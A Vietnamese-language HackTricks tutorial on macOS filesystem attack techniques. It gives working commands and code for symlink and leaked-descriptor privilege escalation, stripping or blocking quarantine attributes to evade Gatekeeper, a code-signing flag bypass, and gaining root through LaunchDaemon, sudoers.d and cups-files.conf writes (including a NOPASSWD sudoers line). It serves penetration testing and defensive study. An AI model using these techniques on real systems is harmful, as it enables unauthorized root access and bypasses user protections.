# Thủ thuật FS macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Các tổ hợp quyền POSIX

Đối với **thư mục**, ba bit quyền có ý nghĩa khác với khi áp dụng cho tệp thông thường. `chmod(1)` gọi bit execute là "**search**" khi áp dụng cho thư mục:<sup>[[2]](#references)</sup>

> `0100` Đối với tệp, cho phép chủ sở hữu thực thi. Đối với thư mục, cho phép chủ sở hữu **tìm kiếm** trong thư mục.

- **read** - bạn có thể **liệt kê** các mục trong thư mục (xem tên).
- **write** - bạn có thể **tạo, đổi tên và xóa các mục** trong thư mục. Lưu ý đây là thuộc tính của thư mục *chứa*, không phải của tệp: bạn có thể xóa một tệp mà mình không thể đọc hoặc ghi, miễn là bạn có quyền ghi vào thư mục cha của tệp đó.
  - Để xóa một **thư mục con**, thư mục đó phải rỗng, điều này đòi hỏi bạn có đủ quyền để xóa mọi thứ bên trong.
  - Nếu thư mục có **sticky bit** (`S_ISVTX`, như `/tmp`), quyền này bị hạn chế — POSIX quy định rằng tiến trình chỉ có thể xóa hoặc đổi tên tệp trong đó nếu nó sở hữu tệp, sở hữu thư mục hoặc có đặc quyền phù hợp.<sup>[[1]](#references)</sup>
- **execute / search** - bạn được **phép đi qua** thư mục. Việc phân giải tên đường dẫn tìm từng thành phần "trong thư mục được thành phần đứng trước nó chỉ định", vì vậy **mất quyền search trên bất kỳ thành phần nào trong tiền tố đường dẫn sẽ khiến mọi thứ bên dưới không thể truy cập qua đường dẫn**, ngay cả khi tệp cuối cùng có quyền đọc cho mọi người.<sup>[[1]](#references)</sup>

### Các tổ hợp nguy hiểm

**Cách ghi đè tệp/thư mục do root sở hữu**, khi:

- **Chủ sở hữu thư mục** cha ở một vị trí bất kỳ trong đường dẫn là người dùng
- **Chủ sở hữu thư mục** cha ở một vị trí bất kỳ trong đường dẫn là **nhóm người dùng** có **quyền ghi**
- Một **nhóm người dùng** có quyền **ghi** vào **tệp**

Với bất kỳ tổ hợp nào ở trên, kẻ tấn công có thể **chèn** một **symlink/hard link** vào đường dẫn dự kiến để thực hiện ghi tùy ý với đặc quyền cao.

### Trường hợp đặc biệt: thư mục root có R+X

Điều này bắt nguồn trực tiếp từ quy tắc phân giải tên đường dẫn ở trên. Nếu một **thư mục chỉ cấp R+X cho root**, mọi người khác sẽ không thể truy cập các tệp bên trong *qua đường dẫn* — nhưng **các bit quyền của chính tệp vẫn có thể cho phép truy cập rộng rãi**. Thư mục là trở ngại duy nhất.

Vì vậy, bất kỳ primitive nào giúp đưa tệp **ra khỏi thư mục đó** — chẳng hạn tiến trình có đặc quyền **di chuyển/đổi tên/sao chép** một đường dẫn do kẻ tấn công chọn vào vị trí mà bạn có thể đi qua — đều cho phép đọc tùy ý mà không cần vượt qua quyền của chính tệp:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Tìm các chương trình có quyền cao dùng để di chuyển tệp (trình cài đặt, công cụ xoay vòng log, bộ thu thập sự cố/chẩn đoán, tính năng sao lưu và "xuất") chấp nhận đường dẫn nguồn do người dùng có quyền thấp hơn cung cấp.

## Symbolic Link / Hard Link

### Tệp/thư mục có quyền hạn lỏng lẻo

Nếu một tiến trình có quyền cao đang ghi dữ liệu vào **tệp** có thể bị **kiểm soát** bởi người dùng có quyền thấp hơn, hoặc có thể đã được người dùng có quyền thấp hơn **tạo từ trước**, thì người dùng đó chỉ cần **trỏ tệp đó đến một tệp khác** thông qua Symbolic Link hoặc Hard Link, và tiến trình có quyền cao sẽ ghi vào tệp đó.

Kiểm tra các phần khác để tìm nơi kẻ tấn công có thể **lạm dụng quyền ghi tùy ý để leo thang đặc quyền**.

### Open `O_NOFOLLOW`

Theo [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Nếu `O_NOFOLLOW` được dùng trong mask và tệp đích truyền cho `open()` là một symbolic link thì `open()` sẽ thất bại."* Chỉ thành phần **cuối cùng** được kiểm tra — mọi thành phần **trung gian** vẫn được phân giải và theo dấu. Vì vậy, nhà phát triển đã "bảo vệ" thao tác ghi bằng `O_NOFOLLOW` vẫn có thể bị tấn công bằng cách đặt symlink trong bất kỳ **thư mục cha** nào của đường dẫn đích.<sup>[[3]](#references)</sup>

Trang man tương tự ghi lại các flag thực sự khắc phục lỗ hổng này:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"nếu ... bất kỳ thành phần nào trong đường dẫn truyền cho `open()` là symbolic link thì `open()` sẽ thất bại."*
- **`O_RESOLVE_BENEATH`** — *"nếu ... quá trình phân giải đường dẫn được chỉ định thoát khỏi thư mục gắn với fd thì `openat()` sẽ thất bại."*

Nếu không, các cách còn lại để ngăn việc thay thế symlink giữa chừng trong đường dẫn là dùng `openat()` tương đối với một directory FD đã được xác thực, hoặc dùng `realpath()` rồi xác thực lại.

## .fileloc

Các tệp có phần mở rộng **`.fileloc`** có thể trỏ đến ứng dụng hoặc binary khác, để khi được mở, ứng dụng/binary đó sẽ được thực thi.\
Ví dụ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Bộ mô tả tệp

### Leak FD (no `O_CLOEXEC`)

Nếu một lệnh gọi `open` không có cờ `O_CLOEXEC`, file descriptor sẽ được kế thừa bởi tiến trình con. Vì vậy, nếu một tiến trình có đặc quyền mở một tệp có đặc quyền rồi thực thi một tiến trình do kẻ tấn công kiểm soát, kẻ tấn công sẽ **kế thừa FD trỏ đến tệp có đặc quyền**.

Ví dụ kinh điển là **LPE `DYLD_PRINT_TO_FILE` trên OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` vẫn xử lý `DYLD_PRINT_TO_FILE=/path` ngay cả trong **các binary bị hạn chế (suid root)**, vì biến cụ thể đó được phân tích bên ngoài `processDyldEnvironmentVariable()`.
- Nó gọi `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, nên **tạo một tệp thuộc sở hữu của root tại một đường dẫn tùy ý**.
- FD **không bao giờ được đóng và không có cờ close-on-exec**, vì vậy mọi tiến trình con của binary suid đều kế thừa **FD có quyền ghi vào một tệp thuộc sở hữu của root**.
- Ví dụ, chạy `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, rồi đọc số FD được kế thừa trong tiến trình con, sẽ cho phép ghi tùy ý vào tệp thuộc sở hữu của root; ngay cả `fcntl(fd, F_SETFL, 0)` cũng xóa `O_APPEND`, cho phép ghi đè thay vì nối thêm.

Cơ chế tương tự xuất hiện bất cứ khi nào một tiến trình có đặc quyền mở tệp **trước khi** `exec` thứ gì đó do bạn kiểm soát (công cụ trợ giúp, trình soạn thảo kiểu `crontab` được gọi thông qua `$EDITOR`, tệp log/debug được mở từ đường dẫn trong biến môi trường...). Liệt kê các FD bạn đã kế thừa bằng:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Bất kỳ thứ gì lớn hơn `2` trỏ đến một tệp mà bạn không thể tự mở đều là primitive arbitrary-write (hoặc arbitrary-read).

## Tránh các thủ thuật xattrs quarantine

### Xóa nó

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### cờ uchg / uchange / uimmutable

Nếu một tệp/thư mục có thuộc tính bất biến này, sẽ không thể gắn xattr lên nó.

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Hệ thống tệp không hỗ trợ xattr

Không phải hệ thống tệp nào macOS có thể gắn kết cũng lưu **extended attributes** nguyên bản. HFS+ và APFS có hỗ trợ; **FAT32, exFAT và (hầu hết) các điểm gắn kết NFS thì không** — macOS mô phỏng chúng bằng cách ghi một tệp phụ **AppleDouble** có tên `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Điều này quan trọng với quarantine, vì xattr chỉ tồn tại nếu có thể thực sự được ghi **và đọc lại** từ cùng một volume:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Nếu volume sau đó được đọc từ một đường dẫn bỏ qua companion `._` (hoặc companion này bị loại bỏ/xóa), file sẽ đến **mà không có cờ quarantine** — và một `.app` không bị quarantine là đủ để thoát khỏi App Sandbox, như đã trình bày trong [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

ACL này ngăn việc thêm `xattrs` vào file.

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```

### **com.apple.acl.text xattr + AppleDouble**

Định dạng tệp **AppleDouble** sao chép một tệp cùng với các ACE của tệp đó.

Trong [**mã nguồn**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), có thể thấy biểu diễn ACL dạng văn bản được lưu bên trong xattr có tên **`com.apple.acl.text`** sẽ được đặt làm ACL cho tệp đã giải nén. Vì vậy, nếu bạn nén một ứng dụng vào tệp zip theo định dạng **AppleDouble** với ACL ngăn các xattr khác được ghi vào đó... thì xattr quarantine sẽ không được đặt cho ứng dụng:

Xem [**báo cáo gốc**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) để biết thêm thông tin.<sup>[[6]](#references)</sup>

Để tái hiện việc này, trước tiên chúng ta cần lấy chuỗi ACL chính xác:

```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```

(Lưu ý rằng ngay cả khi cách này hoạt động, sandbox vẫn ghi quarantine xattr trước đó)

Không thực sự cần thiết, nhưng tôi vẫn để đó phòng trường hợp cần:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass kiểm tra chữ ký

### Bypass kiểm tra platform binaries

Một số kiểm tra bảo mật xác minh binary có phải là **platform binary** hay không, ví dụ để cho phép kết nối tới một XPC service. Tuy nhiên, như được trình bày trong bài viết https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, có thể bypass bước kiểm tra này bằng cách lấy một platform binary (chẳng hạn /bin/ls) rồi inject exploit thông qua dyld bằng biến môi trường `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass các flag `CS_REQUIRE_LV` và `CS_FORCED_LV`

Một binary đang chạy có thể sửa các flag của chính nó để bypass bước kiểm tra, bằng đoạn code như sau:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Bypass Code Signatures

Các bundle chứa tệp **`_CodeSignature/CodeResources`**, trong đó có **hash** của từng **tệp** trong **bundle**. Lưu ý rằng hash của CodeResources cũng được **nhúng trong executable**, nên chúng ta cũng không thể chỉnh sửa nó.

Tuy nhiên, có một số tệp sẽ không được kiểm tra chữ ký; chúng có khóa omit trong plist, chẳng hạn như:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Có thể tính chữ ký của một tài nguyên từ cli bằng:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Mount dmgs

Người dùng có thể mount một dmg tùy chỉnh được tạo ngay cả trên một số thư mục hiện có. Đây là cách bạn có thể tạo một gói dmg tùy chỉnh với nội dung tùy chỉnh:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Thông thường, macOS gắn kết ổ đĩa bằng cách giao tiếp với Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (do `/usr/libexec/diskarbitrationd` cung cấp). Nếu thêm tham số `-d` vào tệp plist của LaunchDaemons rồi khởi động lại, nhật ký sẽ được lưu trong `/var/log/diskarbitrationd.log`.\
Tuy nhiên, bạn có thể dùng các công cụ như `hdik` và `hdiutil` để giao tiếp trực tiếp với kext `com.apple.driver.DiskImages`.

## Ghi tùy ý

### Các script sh chạy định kỳ

Nếu script của bạn có thể được diễn giải dưới dạng **shell script**, bạn có thể ghi đè **`/etc/periodic/daily/999.local`**, một shell script sẽ được kích hoạt hằng ngày.

Bạn có thể **giả lập** việc thực thi script này bằng lệnh: **`sudo periodic daily`**

### Daemon

Tạo một **LaunchDaemon** tùy ý, chẳng hạn **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, với một plist thực thi script tùy ý như:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Chỉ cần tạo script `/Applications/Scripts/privesc.sh` với các **commands** bạn muốn chạy dưới quyền root.

### File Sudoers

Nếu có **arbitrary write**, bạn có thể tạo một file trong thư mục **`/etc/sudoers.d/`** để cấp cho mình quyền **sudo**.

### Các file PATH

File **`/etc/paths`** là một trong những nơi chính dùng để thiết lập biến môi trường PATH. Bạn phải là root để ghi đè file này, nhưng nếu một script từ **process có đặc quyền** chạy một **command không kèm đường dẫn đầy đủ**, bạn có thể **hijack** nó bằng cách sửa đổi file này.

Bạn cũng có thể ghi các file vào **`/etc/paths.d`** để thêm thư mục mới vào biến môi trường `PATH`.

### cups-files.conf

Kỹ thuật này đã được sử dụng trong [bài viết này](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Tạo file `/etc/cups/cups-files.conf` với nội dung sau:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

This sẽ tạo file `/etc/sudoers.d/lpe` với quyền 777. Phần nội dung thừa ở cuối nhằm kích hoạt việc tạo error log.

Sau đó, ghi cấu hình cần thiết để leo thang đặc quyền vào `/etc/sudoers.d/lpe`, chẳng hạn `%staff ALL=(ALL) NOPASSWD:ALL`.

Tiếp theo, sửa lại file `/etc/cups/cups-files.conf`, đặt `LogFilePerm 700` để file sudoers mới hợp lệ khi gọi `cupsctl`.

### Thoát Sandbox

Có thể thoát khỏi macOS sandbox bằng cách ghi tùy ý vào FS. Xem một số ví dụ tại trang [macOS Auto Start](../../../../macos-auto-start-locations.md), nhưng một cách phổ biến là ghi file tùy chọn Terminal vào `~/Library/Preferences/com.apple.Terminal.plist` để chạy lệnh khi khởi động, rồi gọi file đó bằng `open`.

## Tạo file có thể ghi với tư cách người dùng khác

Một primitive privesc rất phổ biến là khiến **một tiến trình có đặc quyền tạo file cho bạn** trong thư mục bạn kiểm soát, rồi giữ **quyền ghi** vào file đó. Cần có hai yếu tố:

1. Một thư mục thuộc sở hữu của bạn (hoặc nơi bạn có thể đặt **ACL có thể kế thừa**), để mọi thứ được tạo bên trong đều kế thừa quyền của bạn.
2. Một tiến trình có đặc quyền/`suid` có thể được chỉ định **nơi** tạo file — thường thông qua biến môi trường debug/logging, file cấu hình hoặc XPC API của một helper.

Phần **ACL có thể kế thừa** giúp bạn có thể ghi vào file được tạo, dù file thuộc sở hữu của người dùng khác. Các cờ kế thừa `file_inherit` / `directory_inherit` được mô tả trong [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Giờ đây, mọi tệp mà một tiến trình có đặc quyền tạo bên trong `$DIRNAME` đều **có thể được bạn ghi vào**. Nếu thư mục đó cũng là nơi sau này được **thực thi với quyền root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, thư mục LaunchDaemon...), đây là cách leo thang đặc quyền trực tiếp lên root. Xem các phần [Sudoers File](#sudoers-file) và [cups-files.conf](#cups-filesconf) ở trên để biết cần ghi gì vào tệp sau khi có được nó.

Để xem ví dụ đầy đủ về chuỗi tấn công "biến môi trường khiến một tiến trình root tạo tệp, rồi FD bị leak cho bạn", hãy xem phần [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) ở trên.

## Bộ nhớ chia sẻ POSIX

**Bộ nhớ chia sẻ POSIX** cho phép các tiến trình trong hệ điều hành tuân thủ POSIX truy cập chung một vùng bộ nhớ, giúp giao tiếp nhanh hơn so với các phương thức giao tiếp liên tiến trình khác. Cách này bao gồm việc tạo hoặc mở một đối tượng bộ nhớ chia sẻ bằng `shm_open()`, đặt kích thước bằng `ftruncate()` và ánh xạ đối tượng vào không gian địa chỉ của tiến trình bằng `mmap()`. Sau đó, các tiến trình có thể đọc và ghi trực tiếp vào vùng bộ nhớ này. Để quản lý truy cập đồng thời và tránh hỏng dữ liệu, thường sử dụng các cơ chế đồng bộ hóa như mutex hoặc semaphore. Cuối cùng, các tiến trình hủy ánh xạ và đóng bộ nhớ chia sẻ bằng `munmap()` và `close()`, đồng thời có thể tùy chọn xóa đối tượng bộ nhớ bằng `shm_unlink()`. Cơ chế này đặc biệt hiệu quả khi cần IPC nhanh, hiệu suất cao trong môi trường có nhiều tiến trình cần truy cập dữ liệu chia sẻ nhanh chóng.

<details>

<summary>Ví dụ mã Producer</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Ví dụ về Consumer Code</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOS guarded descriptors** là một tính năng bảo mật được giới thiệu trong macOS nhằm tăng độ an toàn và độ tin cậy cho các thao tác **file descriptor** trong ứng dụng người dùng. Các guarded descriptor này cho phép gắn những hạn chế hoặc “guard” cụ thể với file descriptor, và kernel sẽ thực thi chúng.

Tính năng này đặc biệt hữu ích để ngăn chặn một số dạng lỗ hổng bảo mật như **truy cập file trái phép** hoặc **race condition**. Những lỗ hổng này có thể xảy ra, chẳng hạn, khi một thread truy cập file description, khiến **một thread dễ bị tấn công khác có thể truy cập file description đó**, hoặc khi một file descriptor được **kế thừa** bởi một child process dễ bị tấn công. Một số hàm liên quan đến chức năng này gồm:

- `guarded_open_np`: Mở file descriptor kèm guard
- `guarded_close_np`: Đóng file descriptor
- `change_fdguard_np`: Thay đổi các cờ guard trên descriptor (kể cả gỡ bỏ cơ chế bảo vệ bằng guard)

## References

- [1] [POSIX.1-2024 — Định nghĩa cơ sở, Ch. 4 (Quyền truy cập file, Bảo vệ thư mục, Phân giải tên đường dẫn)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Những hệ thống file và dịch vụ cloud nào giữ lại extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gót chân Achilles của Gatekeeper: phát hiện lỗ hổng macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Kỷ nguyên mới của các vụ thoát macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Phát hiện lỗ hổng Apple: câu chuyện kiểm tra diskarbitrationd và storagekitd, Phần 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
